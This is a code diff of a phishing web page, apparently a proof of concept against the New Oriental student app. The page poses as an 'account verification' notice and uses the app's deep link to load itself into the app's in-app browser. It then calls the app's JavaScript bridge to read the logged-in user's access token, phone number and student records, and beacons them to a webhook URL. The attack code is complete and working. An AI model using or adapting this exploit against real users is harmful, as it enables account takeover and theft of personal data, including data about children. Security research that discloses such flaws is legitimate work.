@@ -12,17 +12,16 @@
   <a id="golink" style="display:block;text-align:center;background:#07c160;color:#fff;padding:14px;border-radius:8px;text-decoration:none;font-size:16px">继续核验</a>
   <p id="linktext" style="font-size:11px;color:#888;word-break:break-all"></p>
 </div>
-<pre id="out" style="white-space:pre-wrap;font-size:11px;color:#222;background:#f6f6f6;padding:8px;border-radius:6px;display:none"></pre>
+<pre id="out" style="white-space:pre-wrap;font-size:12px;color:#222;background:#f6f6f6;padding:8px;border-radius:6px;display:none"></pre>
 
 <script>
 // ====== 可选：改成你在 https://webhook.site 创建的地址（含uuid），用于服务端日志留证 ======
-// 留空 = 只在屏幕显示（截图/录屏即为证据）
 var EXFIL_BASE = "";
 
 function show(t){ var o=document.getElementById('out'); o.style.display='block'; o.textContent += t + "\n"; }
 function exfil(tag, val){
   var d = String(val).substring(0, 4000);
-  show("[" + tag + "] " + d);
+  show(d);
   if (EXFIL_BASE) {
     new Image().src = EXFIL_BASE + "?tag=" + encodeURIComponent(tag) + "&d=" + encodeURIComponent(d);
   }
@@ -32,41 +31,45 @@ var IN_CONTAINER = false;
 try { IN_CONTAINER = !!(window.xdfhybirdAndroid || window.MoonBridge); } catch(e){}
 
 if (IN_CONTAINER) {
-  // ====== 容器形态：深链已把页面拉进App内置浏览器 ======
   var n = 0, MAX = 8;
   function poll(){
     n++;
     var data = null;
     try { data = window.xdfhybirdAndroid.requireData(); } catch(e){
-      show("[" + n + "] bridge error: " + e);
-      if (n < MAX) setTimeout(poll, 1000);
-      return;
+      if (n < MAX) { setTimeout(poll, 1000); } return;
     }
-    var hasUser = false;
-    try { hasUser = !!(JSON.parse(data).user && JSON.parse(data).user.accessToken); } catch(e){}
-    if (hasUser) {
-      exfil("requireData", data);          // 凭据全套外带
-      try { exfil("requirePageParam", window.xdfhybirdAndroid.requirePageParam()); } catch(e){}
-      show("=== 以上数据已同步至攻击者日志 ===");
+    var j = null;
+    try { j = JSON.parse(data); } catch(e){}
+    if (j && j.user && j.user.accessToken) {
+      var u = j.user;
+      var lines = [
+        "== 新东方App 登录态凭据（来自受害者设备）==",
+        "userId      : " + u.userId,
+        "accessToken : " + u.accessToken,
+        "mobilePhone : " + u.mobilePhone,
+        "loginStatus : " + u.loginStatus
+      ];
+      var stus = (u.students || []).concat(u.currentStudent ? [u.currentStudent] : []);
+      for (var i = 0; i < stus.length; i++) {
+        var s = stus[i];
+        lines.push("学员" + (i+1) + "      : " + (s.studentName||"") + " / " + (s.gradeName||"") +
+                   " / studentId=" + (s.studentId||"") + (s.studentCode ? " / studentCode=" + s.studentCode : ""));
+      }
+      show(lines.join("\n"));
+      exfil("full", JSON.stringify(j));
     } else if (n < MAX) {
-      show("[" + n + "] 等待账号服务初始化...");
       setTimeout(poll, 1000);
     } else {
-      // 深链冷启动跳过了Splash自动登录，账号服务未初始化：容器劫持成功但暂无登录态
-      exfil("requireData_empty", data);
-      show("容器劫持成功，但App进程为冷启动（账号服务未初始化）。");
-      show("请先打开一次新东方App到首页，再重新点击链接即可拿到完整凭据。");
+      show("容器已劫持，但App为冷启动（账号服务未初始化）。请先打开一次新东方App到首页，再重新点开本页。");
     }
   }
   poll();
 } else {
-  // ====== 浏览器形态：受害者入口，深链按钮 ======
   document.getElementById('head').textContent = "账户核验通知";
   var self = "xdfstudent://open/web?fullscreen=0&isImmersive=0&url=" + encodeURIComponent(location.href);
   document.getElementById('golink').href = self;
   document.getElementById('linktext').textContent = self;
   document.getElementById('entry').style.display = 'block';
-  show("当前环境: 普通浏览器(无桥权限)。点击[继续核验]按钮即触发深链，由新东方App容器重新加载本页并执行。");
 }
 </script>
 </body>
